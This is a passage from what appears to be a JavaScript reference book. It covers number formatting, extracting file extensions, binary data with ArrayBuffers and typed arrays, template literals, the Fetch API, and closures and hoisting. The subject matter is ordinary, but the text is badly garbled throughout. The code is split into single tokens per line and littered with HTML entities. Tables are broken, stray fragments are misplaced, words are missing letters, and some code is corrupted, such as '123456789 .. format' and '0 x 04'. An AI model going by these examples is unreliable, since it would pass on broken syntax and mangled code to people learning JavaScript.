| .. n&rbrack; | , variable size of number groups &lbrack;            | 0 .. x&rbrack; |
+==========+================================================+==========+
+-+-+-+

More advanced variant with support of any number of decimals &lbrack;0 and
different delimiter types:

*/&ast;&ast;*

*&ast; Number.prototype.format(n, x, s, c)*

*&ast;*

*&ast; &bsol;@param integer n: length of decimal*

*&ast; &bsol;@param integer x: length of whole part*

*&ast; &bsol;@param mixed s: sections delimiter*

*&ast; &bsol;@param mixed c: decimal delimiter*

*&ast;/*

Number

.

**prototype**

.

format

=

**function**

(

n

,

x

,

s

,

c

)

{

**var**

re

=

&apos;

**&bsol;&bsol;&amp;ast;*

d(?=(

**&bsol;&bsol;&amp;ast;*

d{&apos;

&plus;

(

x

&vert;&vert;

3

)

&plus;

&apos;})+&apos;

&plus;

(

n

&gt;

0

?

&apos;

**&bsol;&bsol;&amp;ast;*

D&apos;

:

&apos;&dollar;&apos;

)

&plus;

&apos;)&apos;

,

num

=

**this**

.

toFixed

(

Math

.

max

(

0

,

&bsol;~&bsol;~n

)

)

;

**return**

(

c

?

num.

replace

(

&apos;.&apos;

,

c

)

:

num

)

.

replace

(

**new**

RegExp

(

re

,

&apos;g&apos;

)

,

&apos;&dollar;&&apos;

&plus;

(

s

&vert;&vert;

&apos;,&apos;

)

)

;

}

;

12345678.9

.

format

(

2

,

3

,

&apos;.&apos;

,

&apos;,&apos;

)

;

*// &quot;12.345.678,90&quot;*

123456.789

.

format

(

4

,

4

,

&apos; &apos;

,

&apos;:&apos;

)

;

*// &quot;12 3456:7890&quot;*

12345678.9

.

format

(

0

,

3

,

&apos;-&apos;

)

;

*// &quot;12-345-679&quot;*

123456789

..

format

(

2

)

;

*// &quot;123,456,789.00&quot;*

## Section 52.2: Extract extension from file name

Fast and short way to extract extension from file name in JavaScript
will be:

**function**

get_extension

(

filename

)

{

**return**

filename.

slice

(

(

filename.

lastIndexOf

(

&apos;.&apos;

)

&minus;

1

&gt;&gt;&gt;

0

)

&plus;

2

)

;

}

  
  .htaccess
  

  

It works correctly both with names having no extension (e.g. myfile)
or starting with . dot (e.g. ):
>
get_extension(&apos;&apos;) *// &quot;&quot;* get_extension(&apos;name&apos;) *// &quot;&quot;*
get_extension(&apos;name.txt&apos;) *// &quot;txt&quot;* get_extension(&apos;.htpasswd&apos;)
*// &quot;&quot;* get_extension(&apos;name.with.many.dots.myext&apos;) *// &quot;myext&quot;*
>
The following solution may extract file extensions from full path:
>
**function** get_extension(path) { **var** basename =
path.split(/&lbrack;&bsol;&bsol;&bsol;&bsol;/&rbrack;/).pop(), *// extract file name from full path
&hellip;* *// (supports &grave;&bsol;&bsol;&bsol;&bsol;&grave; and &grave;/&grave; separators)* pos =
basename.lastIndexOf(&apos;.&apos;); *// get last position of &grave;.&grave;*

**if**

(

basename

===

&apos;&apos;

&vert;&vert;

pos

&lt;

1

)

*// if file name is empty or &hellip;*

**return**

&quot;&quot;

;

*// &grave;.&grave; not found (-1) or comes first (0)*

**return**

basename.

slice

(

pos

&plus;

1

)

;

*// extract extension ignoring &grave;.&grave;*

}

get_extension

(

&apos;/path/to/file.ext&apos;

)

;

*// &quot;ext&quot;*

## Section 52.3: Set object property given its string name

**function**

assign

(

obj

,

prop

,

value

)

{

**if**

(

**typeof**

prop

===

&apos;string&apos;

)

prop

=

prop.

split

(

&apos;.&apos;

)

;

**if**

(

prop.

length

&gt;

1

)

{

**var**

e

=

prop.

shift

(

)

;

assign

(

obj

&lbrack;

e

&rbrack;

=

Object

.

**prototype**

.

toString

.

call

(

obj

&lbrack;

e

&rbrack;

)

===

&apos;&lbrack;object Object&rbrack;&apos;

?

obj

&lbrack;

e

&rbrack;

:

{

}

,

prop

,

value

)

;

}

**else**

obj

&lbrack;

prop

&lbrack;

0

&rbrack;

&rbrack;

=

value

;

}

**var**

obj

=

{

}

,

propName

=

&apos;foo.bar.foobar&apos;

;

assign

(

obj

,

propName

,

&apos;Value&apos;

)

;

*// obj == {*

*// foo : {*

*// bar : {*

*// foobar : &apos;Value&apos;*

*// }*

*// }*

*// }*

# Chapter 53: Binary Data

## Section 53.1: Getting binary representation of an image file

This example is inspired by [this
question](http://stackoverflow.com/q/38334315/2271269).
>
We&apos;ll assume you know how to [load a file using the File
API](http://www.html5rocks.com/en/tutorials/file/dndfiles/).

*// preliminary code to handle getting local file and finally printing
to console*

*// the results of our function ArrayBufferToBinary().*

**var**

file

=

*// get handle to local file.*

**var**

reader

=

**new**

FileReader

(

)

;

reader.

onload

=

**function**

(

event

)

{

**var**

data

=

event.

target

.

result

;

console.

log

(

ArrayBufferToBinary

(

data

)

)

;

}

;

reader.

readAsArrayBuffer

(

file

)

;

*//gets an ArrayBuffer of the file*

Now we perform the actual conversion of the file data into 1&apos;s and
0&apos;s using a DataView:

**function**

ArrayBufferToBinary

(

buffer

)

{

*// Convert an array buffer to a string bit-representation: 0 1 1 0 0
0&hellip;*

**var**

dataView

=

**new**

DataView

(

buffer

)

;

**var**

response

=

&quot;&quot;

,

offset

=

(

8

/

8

)

;

**for**

(

**var**

i

=

0

;

i

&lt;

dataView.

byteLength

;

i

+=

offset

)

{

response

+=

dataView.

getInt8

(

i

)

.

toString

(

2

)

;

}

**return**

response

;

}

  
  toString
  

  

DataViews let you read/write numeric data; getInt8 converts the data
from the byte position - here 0, the value passed in - in the
ArrayBuffer to signed 8-bit integer representation, and (2) converts
the 8-bit integer to binary representation format (i.e. a string of
1&apos;s and 0&apos;s).
>
Files are saved as bytes. The &apos;magic&apos; offset value is obtained by
noting we are taking files stored as bytes i.e. as 8-bit integers and
reading it in 8-bit integer representation. If we were trying to read
our byte-saved (i.e. 8 bits) files to 32-bit integers, we would note
that 32/8 = 4 is the number of byte spaces, which is our byte offset
value.
>
For this task, DataViews are overkill. They are typically used in
cases where endianness or heterogeneity of data are encountered (e.g.
in reading PDF files, which have headers encoded in different bases
and we would like to meaningfully extract that value). Because we just
want a textual representation, we do not care about heterogeneity as
there is never a need to
>
A much better - and shorter - solution can be found using an
UInt8Array typed array, which treats the entire ArrayBuffer as
composed of unsigned 8-bit integers:

**function**

ArrayBufferToBinary

(

buffer

)

{

**var**

uint8

=

**new**

Uint8Array

(

buffer

)

;

**return**

uint8.

reduce

(

(

binary

,

uint8

)

=&gt;

binary

&plus;

uint8.

toString

(

2

)

,

&quot;&quot;

)

;

}

## Section 53.2: Converting between Blobs and ArrayBuers

JavaScript has two primary ways to represent binary data in the
browser. ArrayBuffers/TypedArrays contain mutable (though still
fixed-length) binary data which you can directly manipulate. Blobs
contain immutable binary data which can only be accessed through the
asynchronous File interface.

**Convert a**

**Blob**

**to an**

**ArrayBuffer**

**(asynchronous)**

**var**

blob

=

**new**

Blob

(

&lbrack;

&quot;

**&bsol;&bsol;x**

01

**&bsol;&bsol;x**

02

**&bsol;&bsol;x**

03

**&bsol;&bsol;x**

04

&quot;

&rbrack;

)

,

fileReader

=

**new**

FileReader

(

)

,

array

;

fileReader.

onload

=

**function**

(

)

{

array

=

**this**

.

result

;

console.

log

(

&quot;Array contains&quot;

,

array.

byteLength

,

&quot;bytes.&quot;

)

;

}

;

fileReader.

readAsArrayBuffer

(

blob

)

;

Version ≥ 6

**Convert a Blob to an ArrayBuffer using a Promise (asynchronous)**

**var**

blob

=

**new**

Blob

(

&lbrack;

&quot;

**&bsol;&bsol;x**

01

**&bsol;&bsol;x**

02

**&bsol;&bsol;x**

03

**&bsol;&bsol;x**

&quot;

04

&rbrack;

)

;

**var**

arrayPromise

=

**new**

Promise

(

**function**

(

resolve

)

{

**var**

reader

=

**new**

FileReader

(

)

;

reader.

onloadend

=

**function**

(

)

{

resolve

(

reader.

result

)

;

}

;

reader.

readAsArrayBuffer

(

blob

)

;

}

)

;

arrayPromise.

then

(

**function**

(

array

)

{

console.

log

(

&quot;Array contains&quot;

,

array.

byteLength

,

&quot;bytes.&quot;

)

;

}

)

;

**Convert an**

**ArrayBuffer**

**or typed array to a**

**Blob**

**var**

array

=

**new**

Uint8Array

(

&lbrack;

0

x

04

,

0x06

,

0x07

,

0x08

&rbrack;

)

;

**var**

blob

=

**new**

Blob

(

&lbrack;

array

&rbrack;

)

;

## Section 53.3: Manipulating ArrayBuers with DataViews

DataViews provide methods to read and write individual values from an
ArrayBuffer, instead of viewing the entire thing as an array of a
single type. Here we set two bytes individually then interpret them
together as a 16-bit unsigned integer, first big-endian then
little-endian.

**var**

buffer

=

**new**

ArrayBuffer

(

2

)

;

**var**

view

=

**new**

DataView

(

buffer

)

;

view.

setUint8

(

0

,

0xFF

)

;

view.

setUint8

(

1

,

0x01

)

;

console.

log

(

view.

getUint16

(

0

,

**false**

)

)

;

*// 65281*

console.

log

(

view.

getUint16

(

0

,

**true**

)

)

;

*// 511*

## Section 53.4: Creating a TypedArray from a Base64 string

**var**

data

=

&apos;iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACN&apos;

&plus;

&apos;byblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHx&apos;

&plus;

&apos;gljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==&apos;

;

**var**

characters

=

atob

(

data

)

;

**var**

array

=

**new**

Uint8Array

(

characters.

length

)

;

**for**

(

**var**

i

=

0

;

i

&lt;

characters.

length

;

i

++

)

{

array

&lbrack;

i

&rbrack;

=

characters.

charCodeAt

(

i

)

;

}

## Section 53.5: Using TypedArrays

TypedArrays are a set of types providing different views into
fixed-length mutable binary ArrayBuffers. For the most part, they act
like Arrays that coerce all assigned values to a given numeric type.
You can pass an ArrayBuffer instance to a TypedArray constructor to
create a new view of its data.

**var**

buffer

=

**new**

ArrayBuffer

(

8

)

;

**var**

byteView

=

**new**

Uint8Array

(

buffer

)

;

**var**

floatView

=

**new**

Float64Array

(

buffer

)

;

console.

log

(

byteView

)

;

*// &lbrack;0, 0, 0, 0, 0, 0, 0, 0&rbrack;*

console.

log

(

floatView

)

;

*// &lbrack;0&rbrack;*

byteView

&lbrack;

0

&rbrack;

=

0x01

;

byteView

&lbrack;

1

&rbrack;

=

0x02

;

byteView

&lbrack;

2

&rbrack;

=

0x04

;

byteView

&lbrack;

3

&rbrack;

=

0x08

;

console.

log

(

floatView

)

;

*// &lbrack;6.64421383e-316&rbrack;*

  
  slice                                   (       &hellip;
   - 

  

ArrayBuffers can be copied using the .) method, either directly or
through a TypedArray view.

**var**

byteView2

=

byteView.

slice

(

)

;

**var**

floatView2

=

**new**

Float64Array

(

byteView2.

buffer

)

;

byteView2

&lbrack;

6

&rbrack;

=

0xFF

;

console.

log

(

floatView

)

;

*// &lbrack;6.64421383e-316&rbrack;*

console.

log

(

floatView2

)

;

*// &lbrack;7.06327456e-304&rbrack;*

## Section 53.6: Iterating through an arrayBuer

For a convenient way to iterate through an arrayBuffer, you can create
a simple iterator that implements the DataView methods under the hood:

**var**

ArrayBufferCursor

=

**function**

(

)

{

**var**

ArrayBufferCursor

=

**function**

(

arrayBuffer

)

{

**this**

.

dataview

=

**new**

DataView

(

arrayBuffer

,

0

)

;

**this**

.

size

=

arrayBuffer.

byteLength

;

**this**

.

index

=

0

;

}

ArrayBufferCursor.

**prototype**

.

next

=

**function**

(

type

)

{

**switch**

(

type

)

{

**case**

&apos;Uint8&apos;

:

**var**

result

=

**this**

.

dataview

.

getUint8

(

**this**

.

index

)

;

**this**

.

index

+=

1

;

**return**

result

;

**case**

&apos;Int16&apos;

:

**var**

result

=

**this**

.

dataview

.

getInt16

(

**this**

.

index

,

**true**

)

;

**this**

.

index

+=

2

;

**return**

result

;

**case**

&apos;Uint16&apos;

:

**var**

result

=

**this**

.

dataview

.

getUint16

(

**this**

.

index

,

**true**

)

;

![](./images/image035.png){width="7.486805555555556in"
height="5.360416666666667in"}

You can then create an iterator like this:

**var**

cursor

=

**new**

ArrayBufferCursor

(

arrayBuffer

)

;

You can use the hasNext to check if there&apos;s still items

**for**

(

;

cursor.

hasNext

(

)

;

)

{

*// There&apos;s still items to process*

}

You can use the next method to take the next value:

**var**

nextValue

=

cursor.

next

(

&apos;Float&apos;

)

;

With such an iterator, writing your own parser to process binary data
becomes pretty easy.

# Chapter 54: Template Literals

Template literals are a type of string literal that allows values to
be interpolated, and optionally the interpolation and construction
behaviour to be controlled using a &quot;tag&quot; function.

## Section 54.1: Basic interpolation and multiline strings

Template literals are a special type of string literal that can be
used instead of the standard &apos;&hellip;&apos; or &quot;&hellip;&quot;. They are declared
by quoting the string with backticks instead of the standard single or
double quotes: &grave;&hellip;&grave;.

  
  expression
  

  

Template literals can contain line breaks and arbitrary expressions
can be embedded using the &dollar;{} substitution syntax. By default, the
values of these substitution expressions are concatenated directly
into the string where they appear.

**const**

name

=

&quot;John&quot;

;

**const**

score

=

74

;

console.

log

(

&grave;Game Over

!

&dollar;

{

name

}

&apos;s score was &dollar;{score &ast; 10}.&grave;);

Game Over

!

John

&apos;s score was 740.

## Section 54.2: Tagged strings

A function identified immediately before a template literal is used to
interpret it, in what is called a **tagged template literal**. The tag
function can return a string, but it can also return any other type of
value.

  
  &hellip;substitutions
  

  

The first argument to the tag function, strings, is an Array of each
constant piece of the literal. The remaining arguments, , contain the
evaluated values of each &dollar;{} substitution expression.

**function**

settings

(

strings

,

&hellip;

substitutions

)

{

**const**

result

=

**new**

Map

(

)

;

**for**

(

**let**

i

=

0

;

i

&lt;

substitutions.

length

;

i

++

)

{

result.

**set**

(

strings

&lbrack;

i

&rbrack;

.

trim

(

)

,

substitutions

&lbrack;

i

&rbrack;

)

;

}

**return**

result

;

}

**const**

remoteConfiguration

=

settings&grave;

label &dollar;

{

&apos;Content&apos;

}

servers &dollar;

{

2

&ast;

8

&plus;

1

}

hostname &dollar;

{

location.

hostname

}

&grave;

;

Map

{

&quot;label&quot;

=&gt;

&quot;Content&quot;

,

&quot;servers&quot;

=&gt;

17

,

&quot;hostname&quot;

=&gt;

&quot;stackoverflow.com&quot;

}

  
  raw
  

  

The strings Array has a special . property referencing a parallel
Array of the same constant pieces of the template literal but
*exactly* as they appear in the source code, without any
backslash-escapes being replaced.

**function**

example

(

strings

,

&hellip;

substitutions

)

{

console.

log

(

&apos;strings:&apos;

,

strings

)

;

console.

log

(

&apos;&hellip;substitutions:&apos;

,

substitutions

)

;

}

example&grave;Hello &dollar;

{

&apos;world&apos;

}

.&bsol;&bsol;n&bsol;&bsol;nHow are you

?

&grave;

;

strings

:

&lbrack;

&quot;Hello &quot;

,

&quot;.

**&bsol;&bsol;n**

**&bsol;&bsol;n**

How are you?&quot;

,

raw

:

&lbrack;

&quot;Hello &quot;

,

&quot;.

**&bsol;&bsol;&amp;ast;*

n

**&bsol;&bsol;&amp;ast;*

nHow are you?&quot;

&rbrack;

&rbrack;

substitutions

:

&lbrack;

&quot;world&quot;

&rbrack;

## Section 54.3: Raw strings

  -
  String                                     .       raw
  - - 

  -

The tag function can be used with template literals to access a
version of their contents without interpreting any backslash escape
sequences.

  
  String   .   raw&grave;&bsol;&bsol;n&grave;   will contain a backslash and the lowercase letter n,    **&bsol;&bsol;n**
                            while &grave;&bsol;&bsol;n&grave; or &apos;                                     
      

  

&apos; would contain a single newline character instead.

**const**

patternString

=

String

.

raw

&grave;Welcome

,

(

&bsol;&bsol;w

&plus;

)

!

&grave;

;

**const**

pattern

=

**new**

RegExp

(

patternString

)

;

**const**

message

=

&quot;Welcome, John!&quot;

;

pattern.

exec

(

message

)

;

&lbrack;

&quot;Welcome, John!&quot;

,

&quot;John&quot;

&rbrack;

## Section 54.4: Templating HTML With Template Strings

You can create an HTML&grave;&hellip;&grave; template string tag function to
automatically encodes interpolated values. (This requires that
interpolated values are only used as text, and **may not be safe if
interpolated values are used in code** such as scripts or styles.)

![](./images/image036.png){width="7.486805555555556in"
height="5.666666666666667in"}

&lt;

ul

&gt;

&dollar;

{

names.

map

(

name

=&gt;

HTML&grave;

&lt;

li

&gt;

&dollar;

{

name

}

&lt;

/

li

&gt;

&grave;

)

}

&lt;

/

ul

&gt;

&grave;

;

## Section 54.5: Introduction

Template Literals act like strings with special features. They are
enclosed by by the back-tick &grave;&grave; and can be spanned across multiple
lines.
>
Template Literals can contain embedded expressions too. These
expressions are indicated by a &dollar; sign and curly braces {}

*//A single line Template Literal*

**var**

aLiteral

=

&grave;single line string data&grave;

;

*//Template Literal that spans across lines*

**var**

anotherLiteral

=

&grave;string data that spans

across multiple lines of code&grave;

;

*//Template Literal with an embedded expression*

**var**

x

=

2

;

**var**

y

=

3

;

**var**

theTotal

=

&grave;The total is &dollar;

{

x

&plus;

y

}

&grave;

;

*// Contains &quot;The total is 5&quot;*

*//Comparison of a string and a template literal*

**var**

aString

=

&quot;single line string data&quot;

console.

log

(

aString

===

aLiteral

)

*//Returns true*

There are many other features of String Literals such as Tagged
Template Literals and Raw property. These are demonstrated in other
examples.

# Chapter 55: Fetch

+++
|      | **Details**                                               |
|  **Opt |                                                             |
| ions** |                                                             |
+========+=============================================================+
| method | The HTTP method to use for the request. ex: GET, POST, PUT, |
|        | DELETE, HEAD. Defaults to GET.                              |
+++
| h      | A Headers object containing additional HTTP headers to      |
| eaders | include in the request.                                     |
+++
| body   | The request payload, can be a string or a FormData object.  |
|        | Defaults to **undefined**                                   |
+++

  
  no-cache
  

  

cache The caching mode. **default**, reload,

  
  referrer                The referrer of the request.
   

  

  
  no-cors       ,   same-origin           . Defaults to         no-cors
  -    -

  

  
  same-origin
  

  

mode cors, . credentialsomit, , include. Defaults to omit. redirect
follow, error, manual. Defaults to follow. integrity Associated
integrity metadata. Defaults to empty string.

## Section 55.1: Getting JSON data

*// get some data from stackoverflow*

fetch

(

&quot;https://api.stackexchange.com/2.2/questions/featured?order=desc&sort=activity&site=stackover

flow&quot;

)

.

then

(

resp

=&gt;

resp.

json

(

)

)

.

then

(

json

=&gt;

console.

log

(

json

)

)

.

**catch**

(

err

=&gt;

console.

log

(

err

)

)

;

## Section 55.2: Set Request Headers

fetch

(

&apos;/example.json&apos;

,

{

headers

:

**new**

Headers

(

{

&apos;Accept&apos;

:

&apos;text/plain&apos;

,

&apos;X-Your-Custom-Header&apos;

:

&apos;example value&apos;

}

)

}

)

;

## Section 55.3: POST Data

Posting form data

fetch

(

&grave;

/

example

/

submit&grave;

,

{

method

:

&apos;POST&apos;

,

body

:

**new**

FormData

(

document.

getElementById

(

&apos;example-form&apos;

)

)

}

)

;

Posting JSON data

fetch

(

&grave;

/

example

/

submit.

json

&grave;

,

{

method

:

&apos;POST&apos;

,

body

:

JSON.

stringify

(

{

email

:

document.

getElementById

(

&apos;example-email&apos;

)

.

value

,

comment

:

document.

getElementById

(

&apos;example-comment&apos;

)

.

value

}

)

}

)

;

## Section 55.4: Send cookies

The fetch function does not send cookies by default. There are two
possible ways to send cookies:

1.  Only send cookies if the URL is on the same origin as the calling
    script.

fetch

(

&apos;/login&apos;

,

{

credentials

:

&apos;same-origin&apos;

}

)

2.  Always send cookies, even for cross-origin calls.

fetch

(

&apos;https://otherdomain.com/login&apos;

,

{

credentials

:

&apos;include&apos;

}

)

## Section 55.5: GlobalFetch

The [GlobalFetch](https://fetch.spec.whatwg.org/#globalfetch)
interface exposes the fetch function, which can be used to request
resources.

fetch

(

&apos;/path/to/resource.json&apos;

)

.

then

(

response

=&gt;

{

**if**

(

!

response.

ok

(

)

)

{

**throw**

**new**

Error

(

&quot;Request failed!&quot;

)

;

}

**return**

response.

json

(

)

;

}

)

.

then

(

json

=&gt;

{

console.

log

(

json

)

;

}

)

;

The resolved value is a
[Response](https://fetch.spec.whatwg.org/#response-class) Object. This
Object contains the body of the response, as well as its status and
headers.

## Section 55.6: Using Fetch to Display Questions from the Stack Overflow API

**const**

url

=

&apos;http://api.stackexchange.com/2.2/questions?site=stackoverflow&tagged=javascript&apos;

;

**const**

questionList

=

document.

createElement

(

&apos;ul&apos;

)

;

document.

body

.

appendChild

(

questionList

)

;

**const**

responseData

=

fetch

(

url

)

.

then

(

response

=&gt;

response.

json

(

)

)

;

responseData.

then

(

(

{

items

,

has_more

,

quota_max

,

quota_remaining

}

)

=&gt;

{

**for**

(

**const**

{

title

,

score

,

owner

,

link

,

answer_count

}

of items

)

{

**const**

listItem

=

document.

createElement

(

&apos;li&apos;

)

;

questionList.

appendChild

(

listItem

)

;

**const**

a

=

document.

createElement

(

&apos;a&apos;

)

;

listItem.

appendChild

(

a

)

;

a&period;

href

=

link

;

a&period;

textContent

=

&grave;

&lbrack;

&dollar;

{

score

}

&rbrack;

&dollar;

{

title

}

(

by &dollar;

{

owner.

display_name

&vert;&vert;

&apos;somebody&apos;

}

)

&grave;

}

}

)

;

# Chapter 56: Scope

## Section 56.1: Closures

When a function is declared, variables in the context of its
*declaration* are captured in its scope. For example, in the code
below, the variable x is bound to a value in the outer scope, and then
the reference to x is captured in the context of bar:

**var**

x

=

4

;

*// declaration in outer scope*

**function**

bar

(

)

{

console.

log

(

x

)

;

*// outer scope is captured on declaration*

}

bar

(

)

;

*// prints 4 to console*

Sample output:

4

This concept of &quot;capturing&quot; scope is interesting because we can use
and modify variables from an outer scope even after the outer scope
exits. For example, consider the following:

**function**

foo

(

)

{

**var**

x

=

4

;

*// declaration in outer scope*

**function**

bar

(

)

{

console.

log

(

x

)

;

*// outer scope is captured on declaration*

}

**return**

bar

;

*// x goes out of scope after foo returns*

}

**var**

barWithX

=

foo

(

)

;

barWithX

(

)

;

*// we can still access x*

Sample output:

4

In the above example, when foo is called, its context is captured in
the function bar. So even after it returns, bar can still access and
modify the variable x. The function foo, whose context is captured in
another function, is said to be a *closure*.
>
**Private data**
>
This lets us do some interesting things, such as defining &quot;private&quot;
variables that are visible only to a specific function or set of
functions. A contrived (but popular) example:

**function**

makeCounter

(

)

{

**var**

counter

=

0

;

**return**

{

value

:

**function**

(

)

{

**return**

counter

;

}

,

increment

:

**function**

(

)

{

counter

++

;

}

}

;

}

**var**

a

=

makeCounter

(

)

;

**var**

b

=

makeCounter

(

)

;

a&period;

increment

(

)

;

console.

log

(

a&period;

value

(

)

)

;

console.

log

(

b&period;

value

(

)

)

;

Sample output:

1

0

  -
  makeCounter   () is called, a snapshot of the context of that       makeCounter
                function is saved. All code inside                    
  - - -

  -

When ()

  
  makeCounter
  

  

will use that snapshot in their execution. Two calls of () will thus
create two different snapshots, with their own copy of counter.
>
**Immediately-invoked function expressions (IIFE)**
>
Closures are also used to prevent global namespace pollution, often
through the use of immediately-invoked function expressions.
>
*Immediately-invoked function expressions* (or, perhaps more
intuitively, *self-executing anonymous functions*) are essentially
closures that are called right after declaration. The general idea
with IIFE&apos;s is to invoke the side-effect of creating a separate
context that is accessible only to the code within the IIFE.
>
Suppose we want to be able to reference jQuery with &dollar;. Consider the
naive method, without using an IIFE:

**var**

&dollar;

=

jQuery

;

*// we&apos;ve just polluted the global namespace by assigning window.&dollar; to
jQuery*

In the following example, an IIFE is used to ensure that the &dollar; is
bound to jQuery only in the context created by the closure:

(

**function**

(

&dollar;

)

{

*// &dollar; is assigned to jQuery here*

}

)

(

jQuery

)

;

*// but window.&dollar; binding doesn&apos;t exist, so no pollution*

See [the canonical answer on
Stackoverflow](http://stackoverflow.com/a/111111/2209007) for more
information on closures.

## Section 56.2: Hoisting

**What is hoisting?**
>
**Hoisting** is a mechanism which moves all variable and function
declarations to the top of their scope. However, variable assignments
still happen where they originally were.
>
For example, consider the following code:

console.

log

(

foo

)

;

*//*

→

*undefined*

**var**

foo

=

42

;

console.

log

(

foo

)

;

*//*

→

*42*

The above code is the same as:

**var**

foo

;

*//*

→

*Hoisted variable declaration*

console.

log

(

foo

)

;

*//*

→

*undefined*

foo

=

42

;

*//*

→

*variable assignment remains in the same place*

console.

log

(

foo

)

;

*//*

→

*42*

Note that due to hoisting the above **undefined** is not the same as
the not defined resulting from running:

console.

log

(

foo

)

;

*//*

→

*foo is not defined*

A similar principle applies to functions. When functions are assigned
to a variable (i.e. a [function
expression](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/function)),
the variable declaration is hoisted while the assignment remains in
the same place. The following two code snippets are equivalent.

console.

log

(

foo

(

2

,

3

)

)

;

*//*

→

*foo is not a function*

**var**

foo

=

**function**

(

a

,

b

)

{

**return**

a

&ast;

b

;

}

**var**

foo

;

console.

log

(

foo

(

2

,

3

)

)

;

*//*

→

*foo is not a function*

foo

=

**function**

(

a

,

b

)

{

**return**

a

&ast;

b

;

}

When declaring [function
statements](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function),
a different scenario occurs. Unlike function statements, function
declarations are hoisted to the top of their scope. Consider the
following code:

console.

log

(

foo

(

2

,

3

)

)

;

*//*

→

*6*

**function**

foo

(

a

,

b

)

{

**return**

a

&ast;

b

;

}

The above code is the same as the next code snippet due to hoisting:

**function**

foo

(

a

,

b

)

{

**return**

a

&ast;

b

;

}

console.

log

(

foo

(

2

,

3

)

)

;

*//*

→

*6*

Here are some examples of what is and what isn&apos;t hoisting:

*// Valid code:*

foo

(

)

;

**function**

foo

(

)

{

}

*// Invalid code:*

bar

(

)

;

*//*

→

*TypeError: bar is not a function*

**var**

bar

=

**function**

(

)

{

}

;

*// Valid code:*

foo

(

)

;

**function**

foo

(

)

{

bar

(

)

;

}

**function**

bar

(

)

{

}

*// Invalid code:*

foo

(

)

;

**function**

foo

(

)

{

bar

(

)

;

*//*

→

*TypeError: bar is not a function*

}

**var**

bar

=

**function**

(

)

{

}

;

*// (E) valid:*

**function**

foo

(

)

{

bar

(

)

;

}

**var**

bar

=

**function**

(

)

{

}

;

foo

(

)

;

**Limitations of Hoisting**
>
Initializing a variable can not be Hoisted or In simple JavaScript
Hoists declarations not initialization.
>
For example: The below scripts will give different outputs.

**var**

x

=

2

;

**var**

y

=

4

;

alert

(

x

&plus;

y

)

;

This will give you an output of 6. But this&hellip;

**var**

x

=

2

;

alert

(

x

&plus;

y

)

;

**var**

y

=

4

;

This will give you an output of NaN. Since we are initializing the
value of y, the JavaScript Hoisting is not happening, so the y value
will be undefined. The JavaScript will consider that y is not yet
declared.
>
So the second example is same as of below.

**var**

x

=

2

;

**var**

y

;

alert

(

x

&plus;

y

)

;

y

=

4

;

This will give you an output of NaN.

![](./images/image037.jpg){width="4.090277777777778in"
height="2.1534722222222222in"}

## Section 56.3: Dierence between var and let

*(Note: All examples using **let** are also valid for **const**)*

**var** is available in all versions of JavaScript, while **let** and
**const** are part of ECMAScript 6 and [only available in some newer
browsers](http://caniuse.com/#search=block%20level). **var** is scoped
to the containing function or the global space, depending when it is
declared:

**var**

x

=

4

;

*// global scope*

**function**

DoThings

(

)

{

**var**

x

=

7

;

*// function scope*

console.

log

(

x

)

;

}

console.

log

(

x

)

;

*// &gt;&bsol;4*

DoThings

(

)

;

*// &gt;&bsol;7*

console.

log

(

x

)

;

*// &gt;&bsol;4*

That means it &quot;escapes&quot; if statements and all similar block
constructs:

**var**

x

=

4

;

**if**

(

**true**

)

{

**var**

x

=

7

;

}

console.

log

(

x

)

;

*// &gt;&bsol;7*

**for**

(

**var**

i

=

0

;

i

&lt;

4

;

i

++

)

{

**var**

j

=

10

;

}

console.

log

(

i

)

;

*// &gt;&bsol;4*

console.

log

(

j

)

;

*// &gt;&bsol;10*

By comparison,

**let**

is block scoped:

**let**

x

=

4

;

**if**

(

**true**

)

{

**let**

x

=

7

;

console.

log

(

x

)

;

*// &gt;&bsol;7*

}

console.

log

(

x

)

;

*// &gt;&bsol;4*

**for**

(

**let**

i

=

0

;

i

&lt;

4

;

i

++

)

{

**let**

j

=

10

;

}

console.

log

(

i

)

;

*// &gt;&amp;quot;ReferenceError: i is not defined&quot;*

console.

log

(

j

)

;

*// &gt;&amp;quot;ReferenceError: j is not defined&quot;*

Note that i and j are only declared in the **for** loop and are
therefore undeclared outside of it.
>
There are several other crucial differences:
>
**Global variable declaration**
>
In the top scope (outside any functions and blocks), **var**
declarations put an element in the global object. **let** does not:

**var**

x

=

4

;

**let**

y

=

7

;

console.

log

(

**this**

.

x

)

;

*// &gt;&bsol;4*

console.

log

(

**this**

.

y

)

;

*// &gt;&bsol;undefined*

**Re-declaration**
>
Declaring a variable twice using **var** doesn&apos;t produce an error
(even though it&apos;s equivalent to declaring it once):

**var**

x

=

4

;

**var**

x

=

7

;

With **let**, this produces an error:

**let**

x

=

4

;

**let**

x

=

7

;

TypeError: Identifier

x

has already been declared

The same is true when

y

is declared with

**var**

:

**var**

y

=

4

;

**let**

y

=

7

;

TypeError: Identifier

y

has already been declared

However variables declared with let can be reused (not re-declared) in
a nested block

**let**

i

=

5

;

{

**let**

i

=

6

;

console.

log

(

i

)

;

*// &gt;&bsol;6*

}

console.

log

(

i

)

;

*// &gt;&bsol;5*

Within the block the outer i can be accessed, but if the within block
has a **let** declaration for i, the outer i can not be accessed and
will throw a ReferenceError if used before the second is declared.

**let**

i

=

5

;

{

i

=

6

;

*// outer i is unavailable within the Temporal Dead Zone*

**let**

i

;

}

ReferenceError: i is not defined

**Hoisting**
>
Variables declared both with **var** and **let** are hoisted. The
difference is that a variable declared with **var** can be referenced
before its own assignment, since it gets automatically assigned (with
**undefined** as its value), but **let** cannotit specifically
requires the variable to be declared before being invoked:

console.

log

(

x

)

;

*// &gt;&bsol;undefined*

console.

log

(

y

)

;

*// &gt;&amp;quot;ReferenceError: &grave;y&grave; is not defined&quot;*

*//OR &gt;&amp;quot;ReferenceError: can&apos;t access lexical declaration &grave;y&grave;
before initialization&quot;*

**var**

x

=

4

;

**let**

y

=

7

;

The area between the start of a block and a **let** or **const**
declaration is known as the [Temporal Dead
Zone](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let#Temporal_dead_zone_and_errors_with_let),
and any references to the variable in this area will cause a
ReferenceError. This happens even if the [variable is assigned before
being
